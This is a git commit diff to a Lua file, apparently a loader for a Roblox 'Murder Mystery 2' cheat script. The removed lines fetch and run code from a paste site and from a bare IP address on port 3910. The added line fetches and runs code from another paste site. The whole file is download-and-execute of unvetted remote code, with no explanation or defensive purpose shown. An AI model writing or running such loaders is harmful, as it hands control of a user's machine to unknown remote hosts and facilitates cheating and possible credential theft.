9fbb5e1c7102000840d1393ea496039ea4d6b760
H4lloww <apeonkovis4@gmail.com>
2025-12-13 02:11:45 +0200

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -1,3 +1,1 @@
-ID="4fc90838-61d9-40e1-a68f-b836307bec48";
-RUN_AFTER=loadstring(game:HttpGet("https://pastefy.app/XJcieLqk/raw"))();
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/ZssRp6k7/raw"))()
